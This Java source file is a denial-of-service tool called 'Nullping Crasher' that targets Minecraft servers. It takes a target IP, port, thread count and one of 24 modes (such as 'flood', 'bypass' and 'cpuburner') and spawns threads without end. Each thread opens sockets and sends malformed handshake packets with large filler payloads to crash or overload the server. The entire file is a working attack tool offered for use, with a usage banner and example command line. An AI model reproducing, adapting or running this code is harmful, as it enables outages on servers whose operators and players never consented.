package me.nzxter.nullping;

import java.io.DataOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintStream;
import java.net.Socket;

public class Nullping {
	public static int threads = 0;	
    public static int number = 0;

    public static void main(String[] args) {
        if (args.length == 6) {
            try {
                Nullping.pingThreadCrasher(args[0], Integer.valueOf(args[1]), Integer.valueOf(args[2]), Integer.valueOf(args[3]), Long.valueOf(args[4]), Integer.valueOf(args[5]));
            }
            catch (NumberFormatException e) {
                System.out.println("The Port/Thread/Amount/Delay/Mode has to be a Number!");
            }
        } else {
            System.out.println("<------------------------------------------------------------------------->");
            System.out.println("                      Nullping Crasher by Nzxter F.M                       ");
            System.out.println("");
            System.out.println("");
            System.out.println("Usage: java -jar nullping.jar IP/Domain PORT THREADS LOOPAMOUNT DELAY MODE");
            System.out.println("Example: java -jar nullping.jar 1.1.1.1/example.net 25565 2500 1900 1 1-24");
            System.out.println("");
            System.out.println("");
            System.out.println("Mode List");
            System.out.println("");
            System.out.println("1. localhost");
            System.out.println("2. bosshandler");
            System.out.println("3. cpulagger");
            System.out.println("4. test1");
            System.out.println("5. test2");
            System.out.println("6. flood1");
            System.out.println("7. flood2");
            System.out.println("8. spigot1");
            System.out.println("9. spigot2");
            System.out.println("10. bypass1");
            System.out.println("11. bypass2");
            System.out.println("12. bypass3");
            System.out.println("13. extreme1");
            System.out.println("14. extreme2");
            System.out.println("15. extreme3");
            System.out.println("16. extreme4");
            System.out.println("17. extreme5");
            System.out.println("18. cpuburner1");
            System.out.println("19. cpuburner2");
            System.out.println("20. cpuburner3");
            System.out.println("21. cpuburner4");
            System.out.println("22. cpuburner5");
            System.out.println("23. cpuburner6");
            System.out.println("24. cpuburner7");
            System.out.println("");
            System.out.println("<------------------------------------------------------------------------->");
        }
    }
    
    
    

    public static void pingThreadCrasher(String ip, int port, int maxThreads, int loopAmount, Long delay, int mode) {
        do {
            if (threads < maxThreads) {
                new Thread(){

                    @Override
                    public void run() {
                        ++threads;
                        try {
                            if (mode == 1) {
                            	Nullping.pingBytes(number + 1);
                                Nullping.localhost(ip, port, loopAmount);
                                System.out.println("New   #" + number);

                            } else if (mode == 2) {
                            	Nullping.pingBytes(number + 1);
                                Nullping.bosshandler(ip, port, loopAmount);
                                System.out.println("New   #" + number);
                                
                            } else if (mode == 3) {
                            	Nullping.pingBytes(number + 1);
                                Nullping.cpulagger(ip, port, loopAmount);
                                System.out.println("New   #" + number);
                                
                            } else if (mode == 4) {
                            	Nullping.pingBytes(number + 1);
                                Nullping.test1(ip, port, loopAmount);
                                System.out.println("New   #" + number);
                                
                            } else if (mode == 5) {
                            	Nullping.pingBytes(number + 1);
                                Nullping.test2(ip, port, loopAmount);
                                System.out.println("New   #" + number);
                                
                            } else if (mode == 6) {
                            	Nullping.pingBytes(number + 1);
                                Nullping.flood1(ip, port, loopAmount);
                                System.out.println("New   #" + number);
                                
                            } else if (mode == 7) {
                            	Nullping.pingBytes(number + 1);
                                Nullping.flood2(ip, port, loopAmount);
                                System.out.println("New   #" + number);

                            } else if (mode == 8) {
                            	Nullping.pingBytes(number + 1);
                                Nullping.spigot1(ip, port, loopAmount);
                                System.out.println("New   #" + number);
                                
                            } else if (mode == 9) {
                            	Nullping.pingBytes(number + 1);
                                Nullping.spigot2(ip, port, loopAmount);   
                                System.out.println("New   #" + number);
                                
                            } else if (mode == 10) {
                            	Nullping.pingBytes(number + 1);
                                Nullping.bypass1(ip, port, loopAmount);
                                System.out.println("New   #" + number);
                                
                            } else if (mode == 11) {
                                Nullping.bypass2(ip, port, loopAmount);
                                System.out.println("New   #" + number);
                                
                            } else if (mode == 12) {
                            	Nullping.pingBytes(number + 1);
                                Nullping.bypass3(ip, port, loopAmount);
                                System.out.println("New   #" + number);
                                
                            } else if (mode == 13) {
                            	Nullping.pingBytes(number + 1);
                                Nullping.extreme1(ip, port, loopAmount);
                                System.out.println("New   #" + number);
                                
                            } else if (mode == 14) {
                            	Nullping.pingBytes(number + 1);
                                Nullping.extreme2(ip, port, loopAmount);
                                System.out.println("New   #" + number);
                                
                            } else if (mode == 15) {
                            	Nullping.pingBytes(number + 1);
                                Nullping.extreme3(ip, port, loopAmount);
                                System.out.println("New   #" + number);
                                
                            } else if (mode == 16) {
                            	Nullping.pingBytes(number + 1);
                                Nullping.extreme4(ip, port, loopAmount);
                                System.out.println("New   #" + number);
                                
                            } else if (mode == 17) {
                            	Nullping.pingBytes(number + 1);
                                Nullping.extreme5(ip, port, loopAmount);
                                System.out.println("New   #" + number);
                                                               
                            } else if (mode == 18) {
                            	Nullping.pingBytes(number + 1);
                                Nullping.cpuburner1(ip, port, loopAmount);
                                System.out.println("New   #" + number);
                                
                            } else if (mode == 19) {
                            	Nullping.pingBytes(number + 1);
                                Nullping.cpuburner2(ip, port, loopAmount);
                                System.out.println("New   #" + number);
                                
                            } else if (mode == 20) {
                            	Nullping.pingBytes(number + 1);
                                Nullping.cpuburner3(ip, port, loopAmount);
                                System.out.println("New   #" + number);
                                
                            } else if (mode == 21) {
                            	Nullping.pingBytes(number + 1);
                                Nullping.cpuburner4(ip, port, loopAmount);
                                System.out.println("New   #" + number);
                                
                            } else if (mode == 22) {
                            	Nullping.pingBytes(number + 1);
                                Nullping.cpuburner5(ip, port, loopAmount);
                                System.out.println("New   #" + number);
                                
                            } else if (mode == 23) {
                            	Nullping.pingBytes(number + 1);
                                Nullping.cpuburner6(ip, port, loopAmount);
                                System.out.println("New   #" + number);
                                
                            } else if (mode == 24) {
                            	Nullping.pingBytes(number + 1);
                                Nullping.cpuburner7(ip, port);
                                System.out.println("New   #" + number);
                            }
                        }
                        catch (Exception exception) {
                            // empty catch block
                        }
                        --threads;
                    }
                }.start();
            }
            try {
                Thread.sleep(delay);
            }
            catch (InterruptedException interruptedException) {
            }
        } while (true);
    }
    
    
    
    public static void pingBytes(int n) {
    	number = n;
    }
    
    
    
    
    
    
    
    public static void localhost(String ip, int port, int loopAmount) throws IOException {
        Socket s = new Socket(ip, port);
        DataOutputStream out = new DataOutputStream(s.getOutputStream());
        out.write(15);
        out.write(0);
        out.write(47);
        out.write(9);
        out.writeBytes("localhost");
        out.write(99);
        out.write(224);
        out.write(1);
        for (int i = 0; i < loopAmount; ++i) {
            out.write(1);
            out.write(0);
        }
    }    

    public static void bosshandler(String ip, int port, int loopAmount) throws IOException {
        Socket s = new Socket(ip, port);
        DataOutputStream out = new DataOutputStream(s.getOutputStream());
        out.write(0);
        out.write(17);
        out.write(19);
        out.write(21);
        out.write(0);
        out.write(-15);
        out.write(-17);
        out.write(-19);
        out.write(-21);
        out.write(1);
        out.write(1);
        out.write(0);
        out.write(1);
        out.write(0);
        out.write(1);
        for (int i = 0; i < loopAmount; ++i) {
          out.write(0);
        }
    }
    
    public static void cpulagger(String ip, int port, int loopAmount) throws IOException {
        Socket s = new Socket(ip, port);
        DataOutputStream out = new DataOutputStream(s.getOutputStream());
        out.write(0);
        out.write(17);
        out.write(19);
        out.write(21);
        out.write(0);
        out.write(-15);
        out.write(-17);
        out.write(-19);
        out.write(-21);
        out.write(1);
        out.write(1);
        out.write(0);
        out.write(1);
        out.write(0);
        out.write(1);
        for (int i = 0; i < loopAmount; ++i) {
          out.write(0);
        }
    }
    
    public static void test1(String ip, int port, int loopAmount) throws IOException {
        Socket s = new Socket(ip, port);
        DataOutputStream out = new DataOutputStream(s.getOutputStream());
        out.write(15);
        out.write(0);
        out.write(47);
        out.write(9);
        out.writeBytes(ip);
        out.write(99);
        out.write(223);
        out.write(2);
        for (int i = 0; i < loopAmount; i++) {
          out.write(2);
          out.write(0);
          out.write(0);
        }
    }
    
    public static void test2(String ip, int port, int loopAmount) throws IOException {
        Socket s = new Socket(ip, port);
        DataOutputStream out = new DataOutputStream(s.getOutputStream());
        out.write(15);
        out.write(0);
        out.write(47);
        out.write(9);
        out.writeBytes(ip);
        out.write(99);
        out.write(224);
        out.write(1);
        for (int i = 0; i < loopAmount; i++) {
          out.write(1);
          out.write(0);
        }
    }
    
    public static void flood1(String ip, int port, int loopAmount) throws IOException {
        Socket s = new Socket(ip, port);
        DataOutputStream out = new DataOutputStream(s.getOutputStream());
        out.write(0);
        out.write(47);
        out.write(20);
        out.write(109);
        out.writeBytes(ip);
        out.write(99);
        out.write(45);
        out.write(50);
        out.write(50);
        out.write(55);
        out.write(55);
        out.write(46);
        out.write(114);
        out.write(97);
        out.write(122);
        out.write(105);
        out.write(120);
        out.write(112);
        out.write(118);
        out.write(112);
        out.write(46);
        out.write(100);
        out.write(101);
        out.write(46);
        out.write(99);
        out.write(-35);
        out.write(2);
        for (int i = 0; i < loopAmount; i++) {
          out.write(1);
          out.write(0);
        }
    }
    
    public static void flood2(String ip, int port, int loopAmount) throws IOException {
        Socket s = new Socket(ip, port);
        DataOutputStream out = new DataOutputStream(s.getOutputStream());
        out.write(0);
        out.write(14);
        out.write(67);
        out.write(114);
        out.writeBytes(ip);
        out.writeShort(port);
        out.write(97);
        out.write(115);
        out.write(104);
        out.write(69);
        out.write(120);
        out.write(99);
        out.write(101);
        out.write(112);
        out.write(116);
        out.write(105);
        out.write(111);
        out.write(110);
        for (int i = 0; i < loopAmount; i++) {
          out.write(1);
          out.write(0);
        }
    }
    
    public static void spigot1(String ip, int port, int loopAmount) throws IOException {
        Socket s = new Socket(ip, port);
        DataOutputStream out = new DataOutputStream(s.getOutputStream());
        out.write(15);
        out.write(0);
        out.write(47);
        out.write(9);
        out.writeBytes(ip);
        out.write(99);
        out.write(224);
        out.write(1);
        for (int i = 0; i < loopAmount; ++i) {
          out.write(1);
          out.write(0);
        }
    }
    
    public static void spigot2(String ip, int port, int loopAmount) throws IOException {
        Socket s = new Socket(ip, port);
        DataOutputStream out = new DataOutputStream(s.getOutputStream());
        out.write(-15);
        out.write(0);
        out.write(-47);
        out.write(-9);
        out.writeBytes(ip);
        out.write(-99);
        out.write(-224);
        out.write(-1);
        for (int i = 0; i < loopAmount; ++i) {
          out.write(1);
          out.write(0);
        }
    }
    
    public static void bypass1(String ip, int port, int loopAmount) throws IOException {
        Socket s = new Socket(ip, port);
        DataOutputStream out = new DataOutputStream(s.getOutputStream());
        out.write(1);
        out.write(0);
        out.write(0);
        out.write(0);
        out.write(10);
        out.write(125);
        out.write(-30);
        out.write(19);
        for (int i = 0; i < loopAmount; ++i) {
          out.write(1);
          out.write(0);
        }
    }
    
    public static void bypass2(String ip, int port, int loopAmount) throws IOException {
        Socket s = new Socket(ip, port);
        DataOutputStream out = new DataOutputStream(s.getOutputStream());
        out.write(-71);
        for (int i = 0; i < loopAmount; ++i) {
          out.write(1);
          out.write(0);
        }
    }
    
    public static void bypass3(String ip, int port, int loopAmount) throws IOException {
        Socket s = new Socket(ip, port);
        DataOutputStream out = new DataOutputStream(s.getOutputStream());
        out.write(0);
        out.write(14);
        out.write(67);
        out.write(114);
        out.writeBytes(ip);
        out.write(97);
        out.write(115);
        out.write(104);
        out.write(69);
        out.write(120);
        out.write(99);
        out.write(101);
        out.write(112);
        out.write(116);
        out.write(105);
        out.write(111);
        out.write(110);
        for (int i = 0; i < loopAmount; ++i) {
            out.write(1);
            out.write(0);
        }
    }
    
    public static void extreme1(String ip, int port, int loopAmount) throws IOException {
        Socket s = new Socket(ip, port);
        DataOutputStream out = new DataOutputStream(s.getOutputStream());
        out.write(15);
        out.write(0);
        out.write(99);
        out.write(453);
        out.writeBytes(ip);
        out.write(457);
        out.write(1);
        for (int i = 0; i < loopAmount; ++i) {
            out.write(1);
            out.write(0);
        }
    }
    
    public static void extreme2(String ip, int port, int loopAmount) throws IOException {
        Socket s = new Socket(ip, port);
        DataOutputStream out = new DataOutputStream(s.getOutputStream());
        out.write(535);
        out.write(456);
        out.write(12);
        out.write(52);
        out.writeBytes(ip);
        out.write(367);
        out.write(1);
        for (int i = 0; i < loopAmount; ++i) {
            out.write(1);
            out.write(0);
        }
    }
    
    public static void extreme3(String ip, int port, int loopAmount) throws IOException {
        Socket s = new Socket(ip, port);
        DataOutputStream out = new DataOutputStream(s.getOutputStream());
        out.write(355);
        out.write(255);
        out.write(155);
        out.write(10);
        out.writeBytes(ip);
        out.write(25);
        out.write(1);
        for (int i = 0; i < loopAmount; ++i) {
            out.write(1);
            out.write(0);
        }
    }
    
    public static void extreme4(String ip, int port, int loopAmount) throws IOException {
        Socket s = new Socket(ip, port);
        DataOutputStream out = new DataOutputStream(s.getOutputStream());
        out.write(15);
        out.write(543);
        out.write(48);
        out.write(9);
        out.writeBytes(ip);
        out.write(15);
        out.write(65);
        out.write(1);
        for (int i = 0; i < loopAmount; ++i) {
            out.write(1);
            out.write(0);
        }
    }
    
    public static void extreme5(String ip, int port, int loopAmount) throws IOException {
        Socket s = new Socket(ip, port);
        DataOutputStream out = new DataOutputStream(s.getOutputStream());
        out.write(624);
        out.write(15);
        out.write(565);
        out.write(346);
        out.writeBytes(ip);
        out.write(0);
        out.write(1);
        for (int i = 0; i < loopAmount; ++i) {
            out.write(1);
            out.write(0);
        }
    }

    public static void cpuburner1(String ip, int port, int loopAmount) throws IOException {
        Socket s = new Socket(ip, port);
        DataOutputStream out = new DataOutputStream(s.getOutputStream());
        out.write(0);
        out.write(47);
        out.write(4);
        out.write(99);
        out.write(-32);
        out.write(1);
        for (int i = 0; i < loopAmount; ++i) {
          out.write(1);
          out.write(0);
        }
    }  
    
    public static void cpuburner2(String ip, int port, int loopAmount) throws IOException {
        Socket s = new Socket(ip, port);
        DataOutputStream out = new DataOutputStream(s.getOutputStream());
        out.write(0);
        out.write(47);
        out.write(13);
        out.write(52);
        out.write(53);
        out.write(46);
        out.write(56);
        out.write(57);
        out.write(46);
        out.write(49);
        out.write(52);
        out.write(49);
        out.write(46);
        out.write(49);
        out.write(52);
        out.write(54);
        out.write(99);
        out.write(-35);
        for (int i = 0; i < loopAmount; ++i) {
          out.write(1);
          out.write(0);
        }
    } 
    
    public static void cpuburner3(String ip, int port, int loopAmount) throws IOException {
        Socket s = new Socket(ip, port);
        DataOutputStream out = new DataOutputStream(s.getOutputStream());
        out.write(Integer.MAX_VALUE - 100);
        out.write(47);
        out.write(20);
        out.write(109);
        out.writeBytes(ip);
        out.writeShort(port);
        out.write(99);
        out.write(45);
        out.write(50);
        out.write(50);
        out.write(55);
        out.write(55);
        out.write(46);
        out.write(114);
        out.write(97);
        out.write(122);
        out.write(105);
        out.write(120);
        out.write(112);
        out.write(118);
        out.write(112);
        out.write(46);
        out.write(100);
        out.write(101);
        out.write(46);
        out.write(99);
        out.write(-35);
        out.write(2);
        for (int i = 0; i < loopAmount; i++) {
          out.write(1);
          out.write(0);
        }
    } 
    
    public static void cpuburner4(String ip, int port, int loopAmount) throws IOException {
        Socket s = new Socket(ip, port);
        DataOutputStream out = new DataOutputStream(s.getOutputStream());
        out.write(118);
        out.write(119);
        out.write(121);
        out.write(119);
        out.write(52);
        out.write(119);
        out.write(69);
        out.write(70);
        out.write(79);
        out.write(89);
        out.write(64);
        out.write(89);
        out.write(70);
        out.write(64);
        out.write(70);
        out.write(89);
        out.write(78);
        out.write(70);
        out.write(123);
        out.write(79);
        out.write(22);
        out.write(4);
        out.write(31);
        out.write(50);
        out.write(15);
        out.write(20);
        out.write(18);
        out.write(7);
        out.write(3);
        out.write(30);
        out.write(24);
        out.write(25);
        for (int i = 0; i < loopAmount; ++i) {
          out.write(118);
          out.write(119);
        }
    }   
    
    public static void cpuburner5(String ip, int port, int loopAmount) throws IOException {
        Socket s = new Socket(ip, port);
        DataOutputStream out = new DataOutputStream(s.getOutputStream());
        out.write(0);
        out.write(0);
        out.write(67);
        out.write(0);
        out.write(114);
        out.write(0);
        out.write(49);
        out.write(57);
        out.write(51);
        out.write(46);
        out.write(51);
        out.write(50);
        out.write(46);
        out.write(54);
        out.write(46);
        out.write(31);
        out.write(-112);
        out.write(97);
        out.write(115);
        out.write(104);
        out.write(69);
        out.write(120);
        out.write(99);
        out.write(101);
        out.write(112);
        out.write(116);
        out.write(105);
        out.write(111);
        out.write(110);
        for (int i = 0; i < loopAmount; ++i) {
          out.write(1);
          out.write(0);
        }
    }  
    
    public static void cpuburner6(String ip, int port, int loopAmount) throws IOException {
        Socket s = new Socket(ip, port);
        DataOutputStream out = new DataOutputStream(s.getOutputStream());
        out.write(0);
        out.write(47);
        out.write(13);
        out.write(52);
        out.write(53);
        out.write(46);
        out.write(56);
        out.write(57);
        out.write(46);
        out.write(49);
        out.write(52);
        out.write(49);
        out.write(46);
        out.write(49);
        out.write(52);
        out.write(54);
        out.write(99);
        out.write(-35);
        for (int i = 0; i < loopAmount; ++i) {
          out.write(1);
          out.write(0);
        }
    }  
    
    public static void cpuburner7(String ip, int port) throws IOException {
        Socket s = new Socket(ip, port);
        DataOutputStream out = new DataOutputStream(s.getOutputStream());
        out.write(3);
        out.write(1);
        out.write(0);
        out.write(-69);
        out.write(1);
        out.write(0);
        out.write(0);
        out.write(-73);
        out.write(3);
        out.write(3);
        out.write(-53);
        out.write(-126);
        out.write(-82);
        out.write(83);
        out.write(21);
        out.write(-10);
        out.write(121);
        out.write(2);
        out.write(-62);
        out.write(11);
        out.write(-31);
        out.write(-62);
        out.write(106);
        out.write(-8);
        out.write(117);
        out.write(-23);
        out.write(50);
        out.write(35);
        out.write(60);
        out.write(57);
        out.write(3);
        out.write(63);
        out.write(-92);
        out.write(-57);
        out.write(-75);
        out.write(-120);
        out.write(80);
        out.write(31);
        out.write(46);
        out.write(101);
        out.write(33);
        out.write(0);
        out.write(0);
        out.write(72);
        out.write(0);
        out.write(47);
    }   
}
